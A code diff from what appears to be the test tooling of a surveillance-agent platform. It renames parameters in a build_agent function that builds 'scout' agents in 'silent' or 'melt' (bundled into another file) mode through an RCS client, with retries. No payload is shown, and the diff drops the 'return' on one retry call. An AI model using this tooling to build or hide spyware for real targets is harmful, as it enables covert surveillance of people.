@@ -7,7 +7,7 @@ import re
 import traceback
 
 from AVCommon.logger import logging
-from rcs_client import Rcs_client
+from AVAgent.rcs_client import Rcs_client
 
 
 class connection:
@@ -85,12 +85,12 @@ def create_new_factory(self, operation, target, factory, config):
 
 
 #todo: non e' molto bello passargli la funzione di gestione messaggi (result_adder_function)
-def build_agent(self, factory, result_adder_function, filename, melt=None, kind="silent",tries=0, ):
+def build_agent(self, factory, result_adder_function, zipfilename, melt=None, kind="silent",tries=0, ):
     with connection() as c:
 
         try:
-            if os.path.exists(filename):
-                os.remove(filename)
+            if os.path.exists(zipfilename):
+                os.remove(zipfilename)
 
             if kind=="melt" and melt:
                 logging.debug("- Melt build with: %s" % melt)
@@ -99,10 +99,10 @@ def build_agent(self, factory, result_adder_function, filename, melt=None, kind=
                 self.param['melt']['url'] = "http://%s/%s/" % (c.host, appname)
                 if 'deliver' in self.param:
                     self.param['deliver']['user'] = c.myid
-                r = c.build_melt(factory, self.param, melt, filename)
+                r = c.build_melt(factory, self.param, melt, zipfilename)
             else:
                 logging.debug("- Silent build")
-                r = c.build(factory, self.param, filename)
+                r = c.build(factory, self.param, zipfilename)
 
         #here ML removed lines to statiacally check extraction
 
@@ -111,7 +111,7 @@ def build_agent(self, factory, result_adder_function, filename, melt=None, kind=
             if tries <= 3:
                 tries += 1
                 logging.debug("DBG problem building scout. tries number %s" % tries)
-                return self.build_agent(factory, result_adder_function, filename, melt, kind, tries)
+                self.build_agent(factory, result_adder_function, zipfilename, melt, kind, tries)
             else:
                 result_adder_function("+ ERROR SCOUT BUILD AFTER %s BUILDS" % tries)
                 raise err
@@ -120,3 +120,4 @@ def build_agent(self, factory, result_adder_function, filename, melt=None, kind=
             result_adder_function("+ ERROR SCOUT BUILD EXCEPTION RETRIEVED")
 
             raise e
+        return zipfilename
